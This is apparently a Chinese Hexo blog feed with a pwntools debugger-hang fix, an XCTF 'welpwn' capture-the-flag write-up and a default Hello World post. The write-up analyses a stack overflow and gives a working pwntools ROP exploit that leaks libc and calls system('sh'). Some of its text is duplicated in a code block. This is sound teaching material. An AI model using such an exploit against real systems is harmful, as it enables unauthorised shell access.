    <updated>2021-11-10T13:07:43.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntools-Waiting-for-debugger"><a href="#pwntools-Waiting-for-debugger" class="headerlink" title="pwntools Waiting for debugger"></a>pwntools Waiting for debugger</h1><p>出现了个毛病不知道为什么我gdb.attach调试的时候为什么一直Waiting for debugger一直都在转,我那个时候是蒙着的,不知道为什么这个情况,那个时候我以为我系统有点毛病,然后换docker还是如此,再换虚拟机的还是如此。那个时候我人已经快崩了。搞不定可能当成退役.不过还是解决了.感谢师傅们的帮忙!@xia0ji233,@ReT0_H.R.P</p><p>还有基友的帮助@巡璃</p><p>我们看向问题在动态调试的时候会出现这个样子</p><p><img src="../../images/image-20211110171047150.png" alt="image-20211110171047150"></p><p>就是这个情况会出现按c运行</p><p><img src="../../images/image-20211110171121500.png" alt="image-20211110171121500"></p><p>解决方法:</p><p>在以下目录下找到proc文件,如果是Python3就把python2.7改成你Python3的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python2.7/dist-packages/pwnlib/util/proc.py</span><br></pre></td></tr></table></figure><p>在最后321行-355行中找到以下代码就是这里出了问题，多的我不多说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wait_for_debugger</span>(<span class="params">pid, debugger_pid=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;wait_for_debugger(pid, debugger_pid=None) -&gt; None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Sleeps until the process with PID `pid` is being traced.</span></span><br><span class="line"><span class="string">    If debugger_pid is set and debugger exits, raises an error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        pid (int): PID of the process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = Timeout()</span><br><span class="line">    <span class="keyword">with</span> t.countdown(timeout=<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">with</span> log.waitfor(<span class="string">&#x27;Waiting for debugger&#x27;</span>) <span class="keyword">as</span> l:</span><br><span class="line">            <span class="keyword">while</span> debugger_pid:</span><br><span class="line">                debugger = psutil.Process(debugger_pid)</span><br><span class="line">                <span class="keyword">while</span> t.timeout <span class="keyword">and</span> tracer(pid) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        debugger.wait(<span class="number">0.01</span>)</span><br><span class="line">                    <span class="keyword">except</span> psutil.TimeoutExpired:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        debugger_pid = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">while</span> t.timeout <span class="keyword">and</span> tracer(pid) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tracer(pid):</span><br><span class="line">            l.success()</span><br><span class="line">        <span class="keyword">elif</span> debugger_pid == <span class="number">0</span>:</span><br><span class="line">            l.failure(<span class="string">&quot;debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.failure(<span class="string">&#x27;Debugger did not attach to pid %d within 15 seconds&#x27;</span>, pid)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把以上的代码替换成如下就成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wait_for_debugger</span>(<span class="params">pid, debugger_pid=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;wait_for_debugger(pid, debugger_pid=None) -&gt; None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Sleeps until the process with PID `pid` is being traced.</span></span><br><span class="line"><span class="string">    If debugger_pid is set and debugger exits, raises an error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        pid (int): PID of the process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = Timeout()</span><br><span class="line">    <span class="keyword">with</span> t.countdown(timeout=<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">with</span> log.waitfor(<span class="string">&#x27;Waiting for debugger&#x27;</span>) <span class="keyword">as</span> l:</span><br><span class="line">            <span class="keyword">while</span> debugger_pid:</span><br><span class="line">                debugger = psutil.Process(debugger_pid)</span><br><span class="line">                <span class="keyword">if</span> tracer(pid) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">                <span class="comment">#while t.timeout and tracer(pid) is None:</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    debugger.wait(<span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">except</span> psutil.TimeoutExpired:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    debugger_pid = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">while</span> t.timeout <span class="keyword">and</span> tracer(pid) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tracer(pid):</span><br><span class="line">            l.success()</span><br><span class="line">        <span class="keyword">elif</span> debugger_pid == <span class="number">0</span>:</span><br><span class="line">            l.failure(<span class="string">&quot;debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.failure(<span class="string">&#x27;Debugger did not attach to pid %d within 15 seconds&#x27;</span>, pid)</span><br></pre></td></tr></table></figure><p>详细一点的链接</p><p><a href="https://blog.csdn.net/weixin_43483799/article/details/118885208#t4">https://blog.csdn.net/weixin_43483799/article/details/118885208#t4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwntools-Waiting-for-debugger&quot;&gt;&lt;a href=&quot;#pwntools-Waiting-for-debugger&quot; class=&quot;headerlink&quot; title=&quot;pwntools Waiting for debugger&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="pwntools" scheme="http://example.com/tags/pwntools/"/>
    
  </entry>
  
  <entry>
    <title>xctf-welpwn</title>
    <link href="http://example.com/2021/11/10/xctf-welpwn/"/>
    <id>http://example.com/2021/11/10/xctf-welpwn/</id>
    <published>2021-11-10T07:58:43.000Z</published>
    <updated>2021-11-10T11:06:52.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-welpwn"><a href="#XCTF-welpwn" class="headerlink" title="XCTF welpwn"></a>XCTF welpwn</h1><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们来分析他是怎么样的步骤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Welcome to RCTF\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo((__int64)&amp;buf);#主体是这个函数里面</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数里面(将大小为0x400的值赋值给大小为0x10的s2很明显会造成溢出.问题是buf中有含有\x00会中断循环)</p><p>注释:就是你输入的字符串存放到buf中,在echo函数中,将buf复制到s2时造成了溢出。通过循环逐字节复制,如果读取到00字节，则会中断循环</p><p>这会影响我们的rop构造,因为我们寻找的gadgat都会存在00字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;ROIS&quot;</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RCTF&#123;Welcome&#125;&quot;</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; is not flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后剩下的都懂他覆盖了EBP就是证明是可以溢出,然后我们正常rop发现出毛病了出不了哎,这个时候我们就要去看栈的结构</p><p>我们在他栈里设置断点然后调试一下脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">p= process(<span class="string">&#x27;./welpwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./welpwn&#x27;</span>)</span><br><span class="line"><span class="comment">#main_addr = 0x4007CD</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004008a3</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> +<span class="string">&quot;b&quot;</span>*<span class="number">8</span>+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4007CD&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;RCTF\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> puts_got</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行之后c执行查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>x $sp</span><br><span class="line"><span class="number">0x7ffe4bddc238</span>:<span class="number">0x62626262</span><span class="number">0x62626262</span><span class="number">0x00601018</span><span class="number">0x61616161</span></span><br><span class="line"><span class="number">0x7ffe4bddc248</span>:<span class="number">0x61616161</span><span class="number">0x61616161</span><span class="number">0x61616161</span><span class="number">0x61616161</span></span><br><span class="line"><span class="number">0x7ffe4bddc258</span>:<span class="number">0x62626262</span><span class="number">0x62626262</span><span class="number">0x00601018</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffe4bddc268</span>:<span class="number">0x004005a0</span><span class="number">0x00000000</span><span class="number">0x004007cd</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffe4bddc278</span>:<span class="number">0x510d530a</span><span class="number">0x00007f5f</span><span class="number">0xffffffff</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>我们可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">0x626262620x62626262#就是我们覆盖EBP的值</span><br><span class="line">0x006010180x00000000#他这个值就是我们puts_got的地址，然后后面跟着0x00，发现我们每次地址前后都有0x00截断XCTF welpwn</span><br><span class="line">分析</span><br><span class="line">我们来分析他是怎么样的步骤</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-400h]</span><br><span class="line">​</span><br><span class="line">  write(1, &quot;Welcome to RCTF\n&quot;, 0x10uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);</span><br><span class="line">  echo((__int64)&amp;buf);                  #主体是这个函数里面</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">这个函数里面(将大小为0x400的值赋值给大小为0x10的s2很明显会造成溢出.问题是buf中有含有\x00会中断循环)</span><br><span class="line"></span><br><span class="line">注释:就是你输入的字符串存放到buf中,在echo函数中,将buf复制到s2时造成了溢出。通过循环逐字节复制,如果读取到00字节，则会中断循环</span><br><span class="line"></span><br><span class="line">这会影响我们的rop构造,因为我们寻找的gadgat都会存在00字节</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">int __fastcall echo(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s2[16]; // [rsp+10h] [rbp-10h]</span><br><span class="line">​</span><br><span class="line">  for ( i = 0; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = 0;</span><br><span class="line">  if ( !strcmp(&quot;ROIS&quot;, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;RCTF&#123;Welcome&#125;&quot;, s2);</span><br><span class="line">    puts(&quot; is not flag&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return printf(&quot;%s&quot;, s2);</span><br><span class="line">&#125;</span><br><span class="line">然后剩下的都懂他覆盖了EBP就是证明是可以溢出,然后我们正常rop发现出毛病了出不了哎,这个时候我们就要去看栈的结构</span><br><span class="line"></span><br><span class="line">我们在他栈里设置断点然后调试一下脚本如下</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">from pwn import *</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">p= process(&#x27;./welpwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./welpwn&#x27;)</span><br><span class="line">#main_addr = 0x4007CD</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr=elf.symbols[&#x27;main&#x27;]</span><br><span class="line">pop_rdi_ret=0x00000000004008a3</span><br><span class="line">payload = b&quot;a&quot;*0x18 +&quot;b&quot;*8+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">gdb.attach(p,&quot;b *0x4007CD&quot;)</span><br><span class="line">p.sendlineafter(&quot;RCTF\n&quot;,payload)</span><br><span class="line">print puts_got</span><br><span class="line">p.interactive()</span><br><span class="line">运行之后c执行查看</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">pwndbg&gt; x/20x $sp</span><br><span class="line">0x7ffe4bddc238: 0x62626262  0x62626262  0x00601018  0x61616161</span><br><span class="line">0x7ffe4bddc248: 0x61616161  0x61616161  0x61616161  0x61616161</span><br><span class="line">0x7ffe4bddc258: 0x62626262  0x62626262  0x00601018  0x00000000</span><br><span class="line">0x7ffe4bddc268: 0x004005a0  0x00000000  0x004007cd  0x00000000</span><br><span class="line">0x7ffe4bddc278: 0x510d530a  0x00007f5f  0xffffffff  0x00000000</span><br><span class="line">我们可以看到</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以猜测我们之前是溢出的字符0x10+ebp(覆盖)的值,地址是(4位一个地址)我们得到下面是我们的栈的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe4bddc248:0x616161610x616161610x616161610x61616161</span><br><span class="line">0x7ffe4bddc258:0x626262620x626262620x006010180x00000000</span><br><span class="line">0x7ffe4bddc268:0x004005a00x000000000x004007cd0x00000000</span><br></pre></td></tr></table></figure><p>这个时候有00截断就不能正常ROP了,我们可以将rop链转到buf中所以要用到四个pop和一个返回地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary welpwn --only &#x27;pop|ret&#x27; </span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>这是将’a’*10+’b’*8+pop4_ret的地址都pop,pop出来4个堆栈数据那就可以正常ROP了</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取远程进程对象</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,50317)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取本地进程对象</span></span><br><span class="line">p = process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取文件对象</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./welpwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取lib库对象</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">pop4_ret = <span class="number">0x40089c</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop4_ret) + p64(pop_rdi_ret) + p64(write_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>))</span><br><span class="line">p.recv(<span class="number">3</span>)</span><br><span class="line">write_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;write_addr =&gt; %#x&quot;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#0x00000000004003d7=sh</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop4_ret) + p64(pop_rdi_ret) + p64(<span class="number">0x00000000004003d7</span>) + p64(system_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4007CD&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多利用gdb动态调试查看栈中出现了什么情况</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XCTF-welpwn&quot;&gt;&lt;a href=&quot;#XCTF-welpwn&quot; class=&quot;headerlink&quot; title=&quot;XCTF welpwn&quot;&gt;&lt;/a&gt;XCTF welpwn&lt;/h1&gt;&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="xctf-pwn" scheme="http://example.com/tags/xctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/11/08/hello-world/"/>
    <id>http://example.com/2021/11/08/hello-world/</id>
    <published>2021-11-08T04:46:57.765Z</published>
    <updated>2021-11-08T04:46:57.765Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
